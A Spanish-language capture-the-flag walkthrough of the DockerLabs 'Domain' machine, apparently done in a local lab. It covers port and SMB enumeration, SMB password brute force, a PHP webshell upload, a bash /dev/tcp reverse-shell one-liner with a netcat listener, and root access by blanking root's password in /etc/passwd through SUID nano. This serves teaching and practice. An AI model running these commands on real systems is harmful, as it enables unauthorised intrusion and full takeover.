## Introducción

Este documento presenta la resolución completa de la máquina **Domain**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone servicios SMB con un usuario identificable mediante enumeración. Tras un ataque de fuerza bruta, se obtienen credenciales SMB que permiten acceder al recurso compartido `html`, desde donde se sube una webshell para obtener ejecución remota de comandos como `www-data`.
Una vez dentro, se identifican permisos SUID en el binario `nano`, permitiendo modificar `/etc/passwd` y eliminar la contraseña de `root` para acceder directamente como superusuario.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Domain.zip
sudo bash auto_deploy.sh Domain.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Domain/{content,exploits,nmap,scripts}
cd Domain
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP
* **139/tcp** — SMB
* **445/tcp** — SMB

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1768792261/Ports_lb2pw2.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80,139,445 172.17.0.2
```

---

### 1.3 Enumeración SMB

Se utiliza `enum4linux` para enumerar usuarios y recursos compartidos:

```bash
enum4linux -a 172.17.0.2
```

**Hallazgos:**
- Usuarios: `james` y `bob`.
  ![Users SMB](https://res.cloudinary.com/dewqswzke/image/upload/v1768792265/UsersSmb_herglm.png)
- Recursos compartidos: `html` y `print$`.
  ![Shares](https://res.cloudinary.com/dewqswzke/image/upload/v1768792263/SharesSmb_gzcudv.png)

---

### 1.4 Enumeración web

Se realiza un escaneo de directorios:

```bash
feroxbuster -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -x php,html,txt,js,json -t 100 -C 404
```

No se encuentran recursos adicionales más allá del `index` por defecto:

![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1768792261/Index_hf8tqx.png)

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Fuerza bruta SMB

Se utiliza `crackmapexec` para fuerza bruta:

```bash
crackmapexec smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt
```

![Crackmapexec](https://res.cloudinary.com/dewqswzke/image/upload/v1768792261/Crackmapexec_lsftsa.png)

Se obtienen credenciales para el usuario `bob`.

### 2.2 Acceso al recurso compartido

Se accede al recurso `html`:

```bash
smbclient //172.17.0.2/html -U bob%PASSWORD
```

![SMB](https://res.cloudinary.com/dewqswzke/image/upload/v1768792264/Smb_obvigz.png)

### 2.3 Subida de webshell

Se sube una webshell en PHP:

![Shell SMB](https://res.cloudinary.com/dewqswzke/image/upload/v1768792263/ShellSmb_jqzdof.png)

Se comprueba la ejecución:

![ID webshell](https://res.cloudinary.com/dewqswzke/image/upload/v1768792261/IdShell_ssl8i6.png)

### 2.4 Reverse shell

Se inicia un listener:

```bash
nc -nlvp 443
```

Se ejecuta el payload:

```bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1768792262/ReverseShell_fgizwq.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → bob

Se reutilizan las credenciales SMB para acceder como `bob`:

```bash
su bob
```

### 3.2 De bob → root

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1768792261/FInd_zrjq5a.png)

Se identifica que `nano` tiene permisos SUID. Se edita `/etc/passwd` para eliminar la `x` de la línea de `root`:

```bash
nano /etc/passwd
# Eliminar la 'x' de la línea de root
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1768792262/Root_ji649h.png)
